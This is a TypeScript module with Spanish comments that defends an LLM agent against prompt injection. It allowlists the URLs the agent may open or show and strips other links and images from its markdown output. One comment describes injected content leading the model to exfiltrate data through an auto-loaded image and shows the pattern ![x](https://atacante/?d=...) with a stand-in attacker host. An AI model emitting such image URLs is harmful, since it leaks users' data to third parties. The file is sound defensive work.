// allowlist de urls (owasp llm01): el agente solo puede abrir pestañas y mostrar imágenes
// de los dominios que el proyecto necesita. todo lo demás se descarta en el servidor,
// aunque el llm haya sido engañado por una inyección (directa o indirecta).
// la widget tiene su propia validación (src/transport/actions.ts y tmdbPosterUrl.ts):
// esta es una segunda capa, del lado del servidor

// books.google.<tld> o books.google.<com|co>.<pais>. el regex está anclado completo,
// así "books.google.com.attacker.test" no pasa
const GOOGLE_BOOKS_HOST = /^books\.google\.(?:[a-z]{2,3}|com?\.[a-z]{2})$/;
const IMDB_HOSTS = new Set(['imdb.com', 'www.imdb.com', 'm.imdb.com']);
const IMDB_PATH = /^\/(?:title\/tt\d{1,12}\/?)?$/;
const VOLUME_ID = /^[A-Za-z0-9_-]{1,128}$/;
const TMDB_POSTER_PATH = /^\/t\/p\/[a-z0-9]{1,12}\/[A-Za-z0-9_-]{1,128}\.(?:jpg|jpeg|png|webp)$/;
// links informativos que sí se pueden mostrar (no se abren solos): la atribución de tmdb
const EXTRA_LINK_HOSTS = new Set(['www.themoviedb.org', 'themoviedb.org']);

// parsea una url https "limpia": sin usuario, contraseña ni puerto
function parseHttps(value: string): URL | null {
  let url: URL;
  try {
    url = new URL(value);
  } catch {
    return null;
  }
  if (url.protocol !== 'https:' || url.username || url.password || url.port) return null;
  return url;
}

// ¿se puede mandar un frame action open_url con esta url?
export function isAllowedActionUrl(value: string): boolean {
  const url = parseHttps(value);
  if (!url) return false;
  if (IMDB_HOSTS.has(url.hostname)) {
    return !url.search && !url.hash && IMDB_PATH.test(url.pathname);
  }
  if (GOOGLE_BOOKS_HOST.test(url.hostname)) {
    const keys = [...url.searchParams.keys()];
    return (
      url.pathname === '/books' &&
      !url.hash &&
      keys.length === 1 &&
      keys[0] === 'id' &&
      VOLUME_ID.test(url.searchParams.get('id') ?? '')
    );
  }
  return false;
}

// ¿se puede mostrar esta imagen en el markdown? solo pósters de tmdb.
// una imagen la descarga el navegador sin click, por eso es el canal favorito para
// exfiltrar datos (![x](https://atacante/?d=...)): la regla es estricta
export function isAllowedImageUrl(value: string): boolean {
  const url = parseHttps(value);
  return (
    url !== null &&
    url.hostname === 'image.tmdb.org' &&
    !url.search &&
    !url.hash &&
    TMDB_POSTER_PATH.test(url.pathname)
  );
}

// ¿se puede mostrar este link (que el usuario abre con click) en el markdown?
export function isAllowedLinkUrl(value: string): boolean {
  if (isAllowedActionUrl(value)) return true;
  const url = parseHttps(value);
  return url !== null && EXTRA_LINK_HOSTS.has(url.hostname);
}

export interface SanitizedMarkdown {
  text: string;
  // urls que se quitaron (para logs y para el reporte de evals)
  removed: string[];
}

// ![alt](url "titulo") o [texto](url), con la url opcionalmente entre <>
const INLINE_LINK = /(!?)\[([^\]\n]*)\]\(\s*<?([^\s)>]+)>?(?:\s+(?:"[^"\n]*"|'[^'\n]*'))?\s*\)/g;
// [ref]: url "titulo"
const REFERENCE_DEFINITION = /^ {0,3}\[[^\]\n]+\]:[ \t]*<?([^\s>]+)>?.*$/gm;
// <img ...> crudo (la widget no renderiza html, pero no dejamos que salga del servidor)
const HTML_IMG = /<img\b[^>]*>/gi;
const HTML_SRC = /\bsrc\s*=\s*["']?([^"'\s>]+)/i;
const BARE_URL = /https?:\/\/[^\s<>()[\]"'`]+/gi;
const TRAILING_PUNCTUATION = /^(.*?)([.,;:!?]*)$/s;

// quita del markdown las imágenes y links que no están en la allowlist.
// las imágenes se reemplazan por su texto alternativo y los links por su texto
export function sanitizeMarkdownUrls(markdown: string): SanitizedMarkdown {
  const removed: string[] = [];

  let text = markdown.replace(INLINE_LINK, (match, bang: string, label: string, url: string) => {
    const allowed = bang ? isAllowedImageUrl(url) : isAllowedLinkUrl(url);
    if (allowed) return match;
    removed.push(url);
    return label;
  });

  text = text.replace(REFERENCE_DEFINITION, (match, url: string) => {
    if (isAllowedImageUrl(url) || isAllowedLinkUrl(url)) return match;
    removed.push(url);
    return '';
  });

  text = text.replace(HTML_IMG, (tag) => {
    removed.push(HTML_SRC.exec(tag)?.[1] ?? '<img>');
    return '';
  });

  // urls sueltas: remark-gfm las convierte en links, así que también pasan por la allowlist.
  // la puntuación del final ("...tt1/.") no es parte de la url
  text = text.replace(BARE_URL, (match) => {
    const [, url = match, tail = ''] = TRAILING_PUNCTUATION.exec(match) ?? [];
    if (isAllowedLinkUrl(url) || isAllowedImageUrl(url)) return match;
    removed.push(url);
    return `[enlace eliminado]${tail}`;
  });

  return { text, removed };
}
